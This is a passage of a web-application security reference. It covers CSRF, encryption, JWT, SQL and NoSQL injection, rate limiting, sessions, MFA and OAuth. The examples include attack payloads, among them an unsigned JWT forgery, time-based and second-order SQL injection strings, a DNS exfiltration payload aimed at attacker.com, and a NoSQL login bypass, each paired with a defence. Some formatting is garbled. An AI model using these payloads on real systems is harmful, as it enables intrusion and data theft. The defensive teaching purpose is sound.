if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(req.method)) {
| const token = req.headers['x-csrf-token'] | req.body._csrf; |
| if (!token | !verifyCsrfToken(token, req.session.csrfToken)) { |
return res.status(403).json({ error: 'Invalid CSRF token' });
        }
      }
      next();
    }

## ENCRYPTION

## Data Encryption at Rest

**Why it exists:** Protect sensitive data

    // lib/encryption.ts
    import crypto from 'crypto';
    
    const ALGORITHM = 'aes-256-gcm';
    const KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex');
    
    export function encrypt(plaintext: string): string {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(ALGORITHM, KEY, iv);
    
    let encrypted = cipher.update(plaintext, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
    }
    
    export function decrypt(ciphertext: string): string {
    const [ivHex, authTagHex, encrypted] = ciphertext.split(':');
    
    const iv = Buffer.from(ivHex, 'hex');
    const authTag = Buffer.from(authTagHex, 'hex');
    
    const decipher = crypto.createDecipheriv(ALGORITHM, KEY, iv);
      decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encrypted, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
    }
    
    // Password hashing - NEVER store plain passwords
    import bcrypt from 'bcryptjs';
    
    export async function hashPassword(password: string): Promise<string> {
    return bcrypt.hash(password, 12); // 12 rounds
    }
    
    export async function verifyPassword(password: string, hash: string): Promise<boolean> {
    return bcrypt.compare(password, hash);
    }
    

---

## API KEY MANAGEMENT

## Secure API Key Generation

**Why it exists:** Secure programmatic access

// lib/apiKeys.ts
import crypto from 'crypto';
import { prisma } from './prisma';

export async function generateApiKey(userId: string, name: string) {
// Generate key: prefix + random bytes
const prefix = 'sk_live_';
const key = prefix + crypto.randomBytes(32).toString('base64url');

// Store only the hash
const hash = crypto.createHash('sha256').update(key).digest('hex');

await prisma.apiKey.create({
data: {
        userId,
        name,
        hash,
prefix: key.slice(0, 12),
lastUsed: null,
        },
      });

// Return key only once - user must store it
return { key, prefix: key.slice(0, 12) };
    }

export async function validateApiKey(key: string) {
const hash = crypto.createHash('sha256').update(key).digest('hex');

const apiKey = await prisma.apiKey.findFirst({
where: { hash, revokedAt: null },
include: { user: true },
      });

if (apiKey) {
await prisma.apiKey.update({
where: { id: apiKey.id },
data: { lastUsed: new Date() },
        });
      }

return apiKey;
    }

## SECURITY HEADERS 2

## Helmet Configuration

**Why it exists:** HTTP security headers

    import helmet from 'helmet';
    
    app.use(helmet({
    contentSecurityPolicy: {
    directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'", "cdn.example.com"],
    styleSrc: ["'self'", "'unsafe-inline'", "fonts.googleapis.com"],
    imgSrc: ["'self'", "data:", "*.cloudfront.net"],
    connectSrc: ["'self'", "api.example.com"],
    fontSrc: ["'self'", "fonts.gstatic.com"],
    frameSrc: ["'none'"],
    objectSrc: ["'none'"],
        },
      },
    hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
    }));
    

---

### CONTINUED: MORE SECURITY PATTERNS

---

## DEFENSE

## JWT VULNERABILITIES DEEP DIVE

## Production JWT Attack Patterns

**Source:**Auth0 Security Research, PortSwigger Web Security**Why this is critical:** JWT misconfigurations are among top 10 API vulnerabilities

    /**

- JWT VULNERABILITY #1: Algorithm Confusion Attack
- *THE BUG: Server accepts tokens signed with different algorithms
- than expected. Attacker can use "none" algorithm or switch from
- RS256 (asymmetric) to HS256 (symmetric) using public key as secret.

-* REAL INCIDENT: 2015 - Multiple libraries vulnerable

- CVE-2015-9235, CVE-2016-10555

     */

// VULNERABLE: Library switches algorithm based on token header
const jwt = require('jsonwebtoken');

// Attacker creates token with header: {"alg":"none","typ":"JWT"}
// Body: {"sub":"admin","role":"admin"}
// Signature: (empty)
// Some libraries will accept this!

// SECURE: Always specify expected algorithm
function verifyToken(token: string): JWTPayload {
return jwt.verify(token, SECRET_KEY, {
algorithms: ['HS256'], // EXPLICIT algorithm whitelist
issuer: 'your-app',
audience: 'your-api',
      });
    }

    /**

- JWT VULNERABILITY #2: Key Injection in JWK Header
- *THE BUG: JWT header contains embedded JWK (JSON Web Key).
- Server uses attacker-supplied key to verify signature.
- Attacker controls key = attacker can forge any token.

    */

// VULNERABLE: Trust key from token header
const header = JSON.parse(base64Decode(token.split('.')[0]));
const key = header.jwk; // ATTACKER CONTROLLED!
jwt.verify(token, key);

// SECURE: Only use server-side key storage
const TRUSTED_KEYS = await loadKeysFromKMS();

function verifyWithTrustedKeys(token: string): JWTPayload {
const decoded = jwt.decode(token, { complete: true });
const kid = decoded.header.kid;

const key = TRUSTED_KEYS.get(kid);
if (!key) throw new Error('Unknown key ID');

return jwt.verify(token, key, { algorithms: ['RS256'] });
    }

    /**

- JWT VULNERABILITY #3: Weak Secret Brute Force
- *THE BUG: HS256 with weak secret can be cracked offline.
- Once cracked, attacker can forge any token forever.

-*HASHCAT BENCHMARK: 15 billion HS256 attempts/second on GPU*/

// WEAK: Short/predictable secrets
const weakSecrets = [
      'secret',
      'password123',
      process.env.APP_NAME,
      '1234567890',
    ];

// SECURE: Minimum 256-bit entropy
import { randomBytes } from 'crypto';

function generateSecureSecret(): string {
return randomBytes(32).toString('base64'); // 256 bits
    }

// Even better: Use asymmetric (RS256, ES256)
// - No shared secret to leak
// - Can rotate public keys without downtime
// - Supports key revocation via JWKS

    /**

- JWT SECURITY AUDIT CHECKLIST
- *1. [ ] Algorithm specified explicitly (not from token header)
- 2. [ ] Key material from trusted source (not token)
- 3. [ ] Secret has sufficient entropy (256+ bits for HS256)
- 4. [ ] Token expiration enforced (exp claim)
- 5. [ ] Issuer validated (iss claim)
- 6. [ ] Audience validated (aud claim)
- 7. [ ] Token revocation mechanism exists
- 8. [ ] Refresh token rotation implemented

    */

## SQL INJECTION BEYOND BASICS

## Second-Order & Blind SQL Injection

**Source:**OWASP Testing Guide, Real penetration test findings**Why this is hard:** Automated scanners miss these

    /**

- SECOND-ORDER SQL INJECTION
- *THE BUG: Input is safely stored, but later queries use it unsafely.
- Scanner only tests immediate responses, misses delayed execution.

-* EXAMPLE SCENARIO:

- 1. User registers with username: admin'--
- 2. Registration uses parameterized query (safe)
- 3. Password reset uses: `SELECT *FROM users WHERE username = '${username}'`- 4. Attacker triggers password reset for their account
- 5. Query becomes: SELECT* FROM users WHERE username = 'admin'--'
- 6. Attacker gets password reset for admin account

     */

// VULNERABLE: Trusting database values
async function sendPasswordReset(userId: string) {
const user = await db.query('SELECT username FROM users WHERE id = ?', [userId]);

// Username came from DB, but was user-supplied at registration!
const resetToken = await db.query(`INSERT INTO reset_tokens (token, username)
VALUES (?, '${user.username}')  -- VULNERABLE!
RETURNING token`);
    }

// SECURE: Parameterize EVERYWHERE, even "trusted" data
async function sendPasswordResetSecure(userId: string) {
const user = await db.query('SELECT username FROM users WHERE id = ?', [userId]);

const resetToken = await db.query(
'INSERT INTO reset_tokens (token, username) VALUES (?, ?) RETURNING token',
[generateToken(), user.username]  // Parameterized!
      );
    }

    /**

- BLIND SQL INJECTION TECHNIQUES
- *When error messages are hidden, attackers use:
- 1. Boolean-based: Different response for true/false conditions
- 2. Time-based: SLEEP() or heavy query for true condition
- 3. Out-of-band: DNS/HTTP exfiltration

    */

// Time-based blind SQLi detection
// Attacker payload: admin' AND SLEEP(5)--
// If response takes 5 seconds, injection confirmed

// DEFENSE: SQL query timeout + parameterization
const pool = new Pool({
statement_timeout: 5000, // 5 second max
    });

// Out-of-band detection (advanced)
// Payload: admin'; SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\x'))--
// Attacker's DNS receives: 5.7.32.attacker.com

    /**

- NOSQL INJECTION
- *MongoDB and other NoSQL DBs have their own injection patterns

    */

// VULNERABLE: Object injection
app.post('/login', (req, res) => {
const user = await db.collection('users').findOne({
username: req.body.username,  // What if this is { "$gt": "" }?
password: req.body.password,
      });
    });

// Attacker sends: { "username": {"$gt": ""}, "password": {"$gt": ""} }
// Query becomes: find where username > "" AND password > ""
// Returns first user in database!

// SECURE: Type validation + sanitization
import { z } from 'zod';

const loginSchema = z.object({
username: z.string().max(50),
password: z.string().max(100),
    });

app.post('/login', async (req, res) => {
const { username, password } = loginSchema.parse(req.body);
// Now guaranteed to be strings, not objects
    });

## RATE LIMITING BYPASS TECHNIQUES

## Production Rate Limit Evasion

**Source:**Bug bounty reports, Security research**Why standard rate limiting fails:** Attackers know the bypass tricks

    /**

- RATE LIMITING BYPASS TECHNIQUES (FOR DEFENDERS TO KNOW)
- *1. IP ROTATION
- - Cloud IPs, residential proxies, Tor exit nodes
- - Defense: Rate limit by account, not just IP

-* 2. HEADER MANIPULATION

- - X-Forwarded-For: 127.0.0.1
- - X-Real-IP: 10.0.0.1
- - Defense: Only trust headers from known proxies
- *3. PARAMETER POLLUTION
- - /login?user=admin vs /login?user=admin&extra=1
- - Defense: Normalize requests before rate limiting

-* 4. CASE MANIPULATION

- - /Login vs /LOGIN vs /login
- - Defense: Lowercase all paths
- *5. ENCODING TRICKS
- - /login vs /l%6fgin (URL encoded 'o')
- - Defense: Decode before rate limiting

    */

class RobustRateLimiter {
async checkLimit(req: Request): Promise<{ allowed: boolean; retryAfter?: number }> {
// 1. Get TRUE client IP (not spoofed headers)
const ip = this.getTrueClientIP(req);

// 2. Normalize request path
const path = this.normalizePath(req.path);

// 3. Get user ID if authenticated
const userId = req.user?.id;

// 4. Check multiple dimensions
const checks = await Promise.all([
        this.checkIPLimit(ip),
userId && this.checkUserLimit(userId),
        this.checkGlobalLimit(),
        ]);

const blocked = checks.find(c => c && !c.allowed);
if (blocked) {
return { allowed: false, retryAfter: blocked.retryAfter };
        }

return { allowed: true };
      }

private getTrueClientIP(req: Request): string {
// Only trust X-Forwarded-For from known load balancers
const forwardedFor = req.headers['x-forwarded-for'];

if (forwardedFor && this.isFromTrustedProxy(req.ip)) {
// Take rightmost IP (added by our proxy)
const ips = forwardedFor.split(',').map(ip => ip.trim());
return ips[ips.length - 1];
        }

return req.ip;
      }

private normalizePath(path: string): string {
return decodeURIComponent(path)
        .toLowerCase()
.replace(/\/+/g, '/')  // Collapse multiple slashes
.replace(/\/$/, '');   // Remove trailing slash
      }

private isFromTrustedProxy(ip: string): boolean {
const trustedCIDRs = [
'10.0.0.0/8', // Internal network
'172.16.0.0/12', // Internal network
'192.168.0.0/16', // Internal network
        ];

return trustedCIDRs.some(cidr => this.ipInCIDR(ip, cidr));
      }
    }

    /**

- DISTRIBUTED RATE LIMITING
- *Single-server rate limiting doesn't scale.
- Must use centralized store (Redis) for consistency.

-*SLIDING WINDOW ALGORITHM (more accurate than fixed window)*/

class SlidingWindowRateLimiter {
constructor(private redis: Redis) {}

async isAllowed(
key: string,
limit: number,
windowMs: number
): Promise<boolean> {
const now = Date.now();
const windowStart = now - windowMs;

const multi = this.redis.multi();

// Remove old entries
multi.zremrangebyscore(key, 0, windowStart);

// Count current window
        multi.zcard(key);

// Add current request
multi.zadd(key, now.toString(),`${now}-${Math.random()}`);

// Set expiry
multi.expire(key, Math.ceil(windowMs / 1000));

const results = await multi.exec();
const count = results[1][1] as number;

return count < limit;
      }
    }

### [SECURITY RESEARCHER LEVEL] CONTINUED: MORE PATTERNS

### Density: OWASP/Bug Bounty research quality

## SECURITY - PENETRATION TESTING

> **The offensive security patterns**

## Pen Test Phases

    
    1. RECONNAISSANCE
    - Gather public info
    - DNS records, subdomains
    - Tech stack identification
    
    1. SCANNING
    - Port scanning (nmap)
    - Vulnerability scanning
    - Service enumeration
    
    1. EXPLOITATION
    - Attempt identified vulnerabilities
    - Gain access if possible
    
    1. POST-EXPLOITATION
    - Privilege escalation
    - Lateral movement
    - Data exfiltration (simulated)
    
    1. REPORTING
    - Document findings
    - Risk assessment
    - Remediation recommendations
    

---

## Common Findings

| Finding | Risk | Remediation |
|---------|------|-------------|
| SQL Injection | Critical | Parameterized queries |
| XSS | High | Output encoding |
| Weak passwords | High | Password policy |
| Missing headers | Medium | Add security headers |
| Info disclosure | Low | Remove verbose errors |

---

## Bug Bounty Scope

    IN SCOPE:
    
    - Main application
    
    - API endpoints
    
    - Authentication flows
    
    OUT OF SCOPE:
    
    - Third-party services
    
    - Social engineering
    
    - Physical attacks
    
    - DoS testing (unless approved)
    

---

## INCIDENT RESPONSE PLAYBOOK

> **The security incident handling**

## Incident Classification

| Level | Description | Response |
|-------|-------------|----------|
| SEV1 | Active breach, data exposed | Immediate, all hands |
| SEV2 | Vulnerability exploited | Within 1 hour |
| SEV3 | Suspicious activity | Within 4 hours |
| SEV4 | Minor security issue | Next business day |

---

## Response Steps

    
    1. DETECT & IDENTIFY
    - What is happening?
    - When did it start?
    - What systems affected?
    
    1. CONTAIN
    - Isolate affected systems
    - Block malicious IPs
    - Disable compromised accounts
    
    1. ERADICATE
    - Remove malware
    - Patch vulnerabilities
    - Reset credentials
    
    1. RECOVER
    - Restore from clean backups
    - Verify integrity
    - Monitor closely
    
    1. POST-INCIDENT
    - Document timeline
    - Root cause analysis
    - Lessons learned
    - Update defenses
    

---

## Evidence Preservation

    [ ] Capture system state
    [ ] Preserve logs (immutable)
    [ ] Memory dumps if needed
    [ ] Network captures
    [ ] Screenshots
    [ ] Chain of custody
    

---

## SECRETS ROTATION

> **The credential lifecycle patterns**

## Rotation Strategy

    
    1. GENERATE new secret
    1. CONFIGURE both old and new secrets valid
    1. UPDATE all consumers to use new
    1. VERIFY all using new secret
    1. INVALIDATE old secret
    1. DELETE old secret from storage
    

---

## AWS Secrets Manager

    const {
      SecretsManagerClient,
      GetSecretValueCommand
    } = require("@aws-sdk/client-secrets-manager");
    
    const client = new SecretsManagerClient();
    
    async function getSecret(secretName) {
    const response = await client.send(
    new GetSecretValueCommand({ SecretId: secretName })
      );
    return JSON.parse(response.SecretString);
    }
    
    // Enable auto-rotation in AWS Console
    // Lambda function handles rotation
    

---

## Database Password Rotation

    CHALLENGE: Zero-downtime rotation
    
    STEPS:
    
    1. Create new user with same permissions
    1. Update app to use new credentials
    1. Wait for connection pool refresh
    1. Drop old user
    
    OR use dual-password support:
    
    - PostgreSQL: CREATE ROLE with multiple passwords (extensions)
    
    - AWS RDS: Secrets Manager integration
    

---

## AUTHENTICATION PATTERNS

> **The auth implementation patterns**

## Stateless JWT Flow

    
    1. User logs in with credentials
    1. Server validates, creates JWT
    1. JWT contains: { userId, role, exp }
    1. Client stores JWT (httpOnly cookie)
    1. Client sends JWT with each request
    1. Server validates JWT signature
    1. No session storage needed!
    

---

## Refresh Token Pattern

    // Access token: Short-lived (15 min)
    const accessToken = jwt.sign(
    { userId, role },
      ACCESS_SECRET,
    { expiresIn: '15m' }
    );
    
    // Refresh token: Long-lived (7 days)
    const refreshToken = jwt.sign(
    { userId, tokenVersion },
      REFRESH_SECRET,
    { expiresIn: '7d' }
    );
    
    // Store refresh token hash in DB
    // Rotate on each use
    

---

## Token Revocation

    // Option 1: Short expiry (accept gap)
    // Tokens valid until expiry even after logout
    
    // Option 2: Token blacklist
    const blacklist = new Set(); // or Redis
    blacklist.add(tokenId);
    
    // Option 3: Token versioning
    // user.tokenVersion = 1
    // JWT contains version
    // Increment version to invalidate all
    

---

## SECURITY LOGGING

> **The audit and security event patterns**

## What to Log 2

    AUTHENTICATION:

- Login success/failure

- Password reset requests

- MFA challenges

- Session creation/destruction

    AUTHORIZATION:

- Access denied events

- Privilege escalation attempts

- Resource access patterns

DATA ACCESS:

- Sensitive data queries

- Bulk exports

- Admin actions

    SYSTEM:

- Configuration changes

- API key creation/revocation

- User permission changes

## Log Format 2

const securityLog = {
timestamp: new Date().toISOString(),
eventType: 'authentication.login_failure',
severity: 'warning',
actor: {
ip: '192.168.1.1',
userAgent: 'Mozilla/5.0...',
userId: null // Unknown on failed login
      },
target: {
type: 'user',
identifier: 'user@example.com'
      },
outcome: 'failure',
reason: 'invalid_password',
metadata: {
attemptCount: 3,
lockoutTriggered: false
      }
    };

## Alerting Thresholds

    IMMEDIATE ALERT:
    
    - 5 failed logins in 5 minutes (same user)
    
    - Login from new country
    
    - Admin privilege granted
    
    - Bulk data export
    
    DAILY REVIEW:
    
    - All failed login attempts
    
    - Permission changes
    
    - API key usage
    
    WEEKLY:
    
    - Access pattern analysis
    
    - Unused privileges
    

---

## INPUT VALIDATION PATTERNS

> **The data sanitization patterns**

## Zod Schema Validation

    import { z } from 'zod';
    
    const UserSchema = z.object({
    email: z.string().email(),
    password: z.string().min(8).max(100),
    age: z.number().int().positive().max(150).optional(),
    role: z.enum(['user', 'admin']).default('user')
    });
    
    // Parse and validate
    const user = UserSchema.parse(requestBody);
    // Throws ZodError if invalid
    

---

## Express Middleware

    const validate = (schema: z.ZodSchema) => {
    return (req: Request, res: Response, next: NextFunction) => {
    try {
    req.body = schema.parse(req.body);
          next();
    } catch (error) {
    if (error instanceof z.ZodError) {
    return res.status(400).json({
    error: 'Validation failed',
    details: error.errors
            });
          }
          next(error);
        }
      };
    };
    
    app.post('/users', validate(UserSchema), createUser);
    

---

## Sanitization 2

import DOMPurify from 'isomorphic-dompurify';

// HTML sanitization
const cleanHtml = DOMPurify.sanitize(userInput);

// SQL - use parameterized queries (Prisma does this)
// Never concatenate user input into SQL

// File paths - validate and sanitize
const safePath = path.basename(userInput);
// Removes directory traversal

## SECURE SESSION MANAGEMENT

> **The session security patterns**

## Session ID Generation

    // INSECURE: Predictable
    const sessionId = `${userId}-${Date.now()}`;
    
    // SECURE: Cryptographically random
    const sessionId = crypto.randomBytes(32).toString('hex');
    

---

## Cookie Settings 2

res.cookie('session', sessionId, {
httpOnly: true,    // No JS access
secure: true,  // HTTPS only
sameSite: 'strict', // CSRF protection
maxAge: 24 *60*60*1000, // 24 hours
path: '/',
domain: '.example.com'
    });

## Session Fixation Prevention

    // On login: Create NEW session, don't reuse
    app.post('/login', async (req, res) => {
    // Destroy any existing session
      req.session.destroy();
    
    // Create fresh session after auth
    req.session.regenerate(() => {
    req.session.userId = user.id;
        res.redirect('/dashboard');
      });
    });
    

---

## Idle Timeout

    const SESSION_IDLE_TIMEOUT = 30 *60* 1000; // 30 min
    
    app.use((req, res, next) => {
    if (req.session.lastActivity) {
    const idle = Date.now() - req.session.lastActivity;
    if (idle > SESSION_IDLE_TIMEOUT) {
          req.session.destroy();
    return res.redirect('/login');
        }
      }
    req.session.lastActivity = Date.now();
      next();
    });
    

---

## SECURITY HEADERS DEEP DIVE

>**The essential HTTP security headers**

## Strict-Transport-Security

    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    
    WHAT: Forces HTTPS for 1 year
    WHY: Prevents SSL stripping attacks
    PRELOAD: Submit to browser preload list
    
    CAUTION: Test thoroughly before enabling
    Cannot be undone easily!
    

---

## Content-Security-Policy 2

    Content-Security-Policy:
default-src 'self';
script-src 'self' 'unsafe-inline' <<<<<<<https://cdn.example.com;>>>>>>>
style-src 'self' 'unsafe-inline';
img-src 'self' data: https:;
connect-src 'self' <<<<<<<https://api.example.com;>>>>>>>
frame-ancestors 'none';
base-uri 'self';
form-action 'self';

REPORT: Add report-uri to collect violations

## X-Frame-Options

    X-Frame-Options: DENY
    
    OPTIONS:
    
    - DENY: Never allow framing
    
    - SAMEORIGIN: Only same origin
    
    - ALLOW-FROM uri: Specific origin (deprecated)
    
    WHY: Prevents clickjacking attacks
    

---

## Permissions-Policy

    Permissions-Policy:
      geolocation=(),
      microphone=(),
      camera=(),
      payment=(self)
    
    WHAT: Controls browser features
    WHY: Reduces attack surface
    

---

## PASSWORD SECURITY 2

> **The authentication security patterns**

## Hashing Algorithm Choice

    RECOMMENDED: Argon2id
    
    - Memory-hard (resistant to GPU attacks)
    - Modern, well-analyzed
    
    ACCEPTABLE: bcrypt
    
    - Proven, widely supported
    - 10+ rounds minimum
    
    AVOID:
    
    - MD5, SHA1, SHA256 (too fast!)
    - Plain bcrypt without salt
    - Custom hashing schemes
    

---

## Implementation 2

import argon2 from 'argon2';

async function hashPassword(password) {
return await argon2.hash(password, {
type: argon2.argon2id,
memoryCost: 65536,  // 64 MB
timeCost: 3,  // iterations
parallelism: 4  // threads
      });
    }

async function verifyPassword(password, hash) {
try {
return await argon2.verify(hash, password);
} catch {
return false;
      }
    }

## Password Policy

    const passwordPolicy = {
    minLength: 12,  // Not 8!
    maxLength: 128,  // Prevent DoS
    requireUppercase: false, // Debatable
    requireNumber: false,    // Debatable
    requireSpecial: false,   // Debatable
    checkBreached: true  // HaveIBeenPwned API
    };
    
    // Better: Check entropy or use zxcvbn library
    import zxcvbn from 'zxcvbn';
    const result = zxcvbn(password);
    if (result.score < 3) {
    throw new Error(result.feedback.warning);
    }
    

---

## API AUTHENTICATION PATTERNS

> **The secure API access patterns**

## API Key vs JWT vs OAuth

| Method | Use Case | Security |
|--------|----------|----------|
| API Key | Server-to-server | Shared secret |
| JWT | User authentication | Signed tokens |
| OAuth | Third-party access | Delegated auth |

---

## API Key Best Practices

    // Generate secure key
    const apiKey = crypto.randomBytes(32).toString('hex');
    
    // Store hash, not key
    const keyHash = crypto.createHash('sha256').update(apiKey).digest('hex');
    
    // Validate
    function validateApiKey(providedKey) {
    const hash = crypto.createHash('sha256').update(providedKey).digest('hex');
    return db.apiKeys.findOne({ hash });
    }
    

---

## JWT for APIs

    // Create token
    const token = jwt.sign(
    { sub: userId, scope: ['read', 'write'] },
      process.env.JWT_SECRET,
    { expiresIn: '1h', issuer: 'api.example.com' }
    );
    
    // Validate
    app.use((req, res, next) => {
    const token = req.headers.authorization?.replace('Bearer ', '');
    try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
        next();
    } catch {
    res.status(401).json({ error: 'Invalid token' });
      }
    });
    

---

## Scope-Based Authorization

    function requireScope(...requiredScopes) {
    return (req, res, next) => {
    | const userScopes = req.user.scope |  | []; |
    const hasScope = requiredScopes.every(s => userScopes.includes(s));
    
    if (!hasScope) {
    return res.status(403).json({ error: 'Insufficient permissions' });
        }
        next();
      };
    }
    
    app.delete('/users/:id', requireScope('users:delete'), deleteUser);
    

---

## RBAC IMPLEMENTATION

> **Role-Based Access Control patterns**

## Database Schema

    CREATE TABLE roles (
    id SERIAL PRIMARY KEY,
    name VARCHAR UNIQUE NOT NULL
    );
    
    CREATE TABLE permissions (
    id SERIAL PRIMARY KEY,
    name VARCHAR UNIQUE NOT NULL,
    resource VARCHAR NOT NULL,
    action VARCHAR NOT NULL
    );
    
    CREATE TABLE role_permissions (
    role_id INT REFERENCES roles(id),
    permission_id INT REFERENCES permissions(id),
    PRIMARY KEY (role_id, permission_id)
    );
    
    CREATE TABLE user_roles (
    user_id INT REFERENCES users(id),
    role_id INT REFERENCES roles(id),
    PRIMARY KEY (user_id, role_id)
    );
    

---

## Permission Check

    async function hasPermission(
    userId: string,
    resource: string,
    action: string
    ): Promise<boolean> {
    const result = await db.$queryRaw`
    SELECT 1 FROM user_roles ur
    JOIN role_permissions rp ON ur.role_id = rp.role_id
    JOIN permissions p ON rp.permission_id = p.id
    WHERE ur.user_id = ${userId}
    AND p.resource = ${resource}
    AND p.action = ${action}
    LIMIT 1
      `;
    return result.length > 0;
    }
    

---

## Middleware

function requirePermission(resource: string, action: string) {
return async (req: Request, res: Response, next: NextFunction) => {
const canAccess = await hasPermission(req.user.id, resource, action);

if (!canAccess) {
return res.status(403).json({ error: 'Permission denied' });
        }
        next();
      };
    }

    app.delete('/posts/:id',
requirePermission('posts', 'delete'),
      deletePost
    );

## MFA IMPLEMENTATION

> **Multi-factor authentication patterns**

## TOTP (Time-based One-Time Password)

    import speakeasy from 'speakeasy';
    
    // Setup: Generate secret
    const secret = speakeasy.generateSecret({
    name: 'MyApp',
    issuer: 'MyApp'
    });
    
    // Return to user:
    // secret.otpauth_url (for QR code)
    // secret.base32 (for manual entry)
    
    // Verification
    function verifyTOTP(userToken, secret) {
    return speakeasy.totp.verify({
    secret: secret,
    encoding: 'base32',
    token: userToken,
    window: 1 // Allow 30s clock drift
      });
    }
    

---

## Backup Codes

function generateBackupCodes(count = 10) {
const codes = [];
for (let i = 0; i < count; i++) {
        codes.push(crypto.randomBytes(4).toString('hex'));
      }
return codes;
    }

// Store hashed
const hashedCodes = codes.map(code =>
      crypto.createHash('sha256').update(code).digest('hex')
    );

// Verify and consume
async function useBackupCode(userId, code) {
const hash = crypto.createHash('sha256').update(code).digest('hex');
const result = await db.backupCodes.deleteMany({
where: { userId, hash }
      });
return result.count > 0;
    }

## Recovery Flow

    
    1. User loses device
    1. User clicks "Lost access"
    1. User enters backup code
    1. System verifies and consumes code
    1. User sets up new MFA device
    1. Generate new backup codes
    

---

## SECURITY SCANNING

> **The automated vulnerability detection**

## Static Analysis

    
    ## ESLint security plugin
    
    npm install eslint-plugin-security --save-dev
    
    ## .eslintrc.js
    
    module.exports = {
    plugins: ['security'],
    extends: ['plugin:security/recommended']
    };
    

---

## Dependency Scanning 2

## npm audit 2

npm audit

## Snyk

npx snyk test

## OWASP Dependency Check

dependency-check --project "MyApp" --scan ./

    
    ---
    
    ## Container Scanning
    

## GitHub Actions with Trivy

- name: Scan image

uses: aquasecurity/trivy-action@master
  with:
image-ref: myapp:${{ github.sha }}
format: 'table'
exit-code: '1'
severity: 'CRITICAL,HIGH'

    
    ---
    
    ## SAST in CI
    

## GitHub Actions

- name: SonarCloud Scan

uses: SonarSource/sonarcloud-github-action@master
      env:
SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

## Block PR if quality gate fails

- name: Check Quality Gate

| run: |
if [ "${{ steps.sonarqube.outputs.quality-gate-status }}" != "PASSED" ]; then
exit 1
    fi

    
    ---
    
    ## ACCOUNT SECURITY PATTERNS
    
    > **The user account protection patterns**
    
    ## Login Attempt Tracking
    

async function handleLoginAttempt(email, password, ip) {
const key = `login_attempts:${email}`;
const attempts = await redis.incr(key);

if (attempts === 1) {
await redis.expire(key, 15 * 60); // 15 min window
  }

if (attempts > 5) {
await lockAccount(email);
throw new Error('Account locked. Please reset password.');
  }

const user = await authenticate(email, password);
if (user) {
await redis.del(key); // Reset on success
  }

return user;
}

    
    ---
    
    ## Suspicious Activity Detection
    
    const SUSPICIOUS_SIGNALS = {
    NEW_DEVICE: 'new_device',
    NEW_COUNTRY: 'new_country',
    UNUSUAL_TIME: 'unusual_time',
    RAPID_REQUESTS: 'rapid_requests'
        };
    
    async function evaluateLoginRisk(user, context) {
    const signals = [];
    
    if (!await isKnownDevice(user.id, context.deviceId)) {
            signals.push(SUSPICIOUS_SIGNALS.NEW_DEVICE);
          }
    
    if (!await isKnownCountry(user.id, context.country)) {
            signals.push(SUSPICIOUS_SIGNALS.NEW_COUNTRY);
          }
    
    return {
    riskLevel: signals.length > 1 ? 'high' : signals.length ? 'medium' : 'low',
            signals,
    requiresMFA: signals.length > 0
          };
        }
    
    ## Session Security 2
    
    // Terminate all sessions except current
    async function terminateOtherSessions(userId, currentSessionId) {
    await redis.del(`sessions:${userId}`);
    await redis.sadd(`sessions:${userId}`, currentSessionId);
    
    // Notify user
    await sendEmail(userId, 'All other sessions have been logged out');
        }
    
    ## OAUTH 2.0 DEEP DIVE
    
    >**The authorization patterns**
    
    ## PKCE Flow (for SPAs and Mobile)
    
    // 1. Generate code verifier (random string)
    const codeVerifier = generateRandomString(128);
    
    // 2. Create code challenge
    const codeChallenge = base64UrlEncode(sha256(codeVerifier));
    
    // 3. Redirect to authorize with challenge
    const authUrl = `<<<<<<https://auth.example.com/authorize?>>>>>>
          response_type=code&
          client_id=${clientId}&
          redirect_uri=${redirectUri}&
          code_challenge=${codeChallenge}&
          code_challenge_method=S256&
    scope=openid profile email`;
    
    // 4. Exchange code for token (include verifier)
    const tokenResponse = await fetch('<<<<<<https://auth.example.com/token',>>>>>> {
    method: 'POST',
    body: new URLSearchParams({
    grant_type: 'authorization_code',
    code: authorizationCode,
    redirect_uri: redirectUri,
    client_id: clientId,
    code_verifier: codeVerifier  // Proves we started the flow
          })
        });
    
    // WHY PKCE?
    // Prevents code interception attacks
    // No client secret needed in browser
    
    ## Token Storage 2
    
    WHERE TO STORE TOKENS:
    
    ACCESS TOKEN:
    
    - Memory only (best)
    
    - Short-lived (15 min)
    
    REFRESH TOKEN:
    
    - HttpOnly cookie (best)
    
    - NOT localStorage (XSS vulnerable)
    
    GOTCHA: Never store access token in localStorage!
    Any XSS can steal it.
    
    ## Silent Refresh
    
    // Refresh token before expiry
    async function silentRefresh() {
    // Use hidden iframe for same-origin
    // Or use refresh token cookie
    
    const response = await fetch('/api/auth/refresh', {
    method: 'POST',
    credentials: 'include'  // Include cookies
          });
    
    if (response.ok) {
    const { accessToken } = await response.json();
            setAccessToken(accessToken);
            scheduleRefresh(accessToken);
    } else {
    // Refresh failed, user must re-login
            logout();
          }
        }
    
    // Schedule refresh before expiry
    function scheduleRefresh(token) {
    const exp = decodeToken(token).exp;
    const refreshAt = (exp *1000) - Date.now() - 60000; // 1 min before
    setTimeout(silentRefresh, refreshAt);
        }
    
    ## JWT SECURITY PATTERNS
    
    > **The patterns for secure token handling**
    
    ---
    
    ## Token Structure 2
    
        HEADER.PAYLOAD.SIGNATURE
    
    Header: {"alg": "HS256", "typ": "JWT"}
    Payload: {"sub": "user123", "exp": 1234567890}
    Signature: HMACSHA256(header + "." + payload, secret)
    
    ## Access + Refresh Tokens
    

// Generate tokens
function generateTokens(userId: string) {
const accessToken = jwt.sign(
{ sub: userId },
    process.env.ACCESS_SECRET,
{ expiresIn: '15m' }  // Short-lived
  );

const refreshToken = jwt.sign(
{ sub: userId },
    process.env.REFRESH_SECRET,
{ expiresIn: '7d' }  // Long-lived
  );

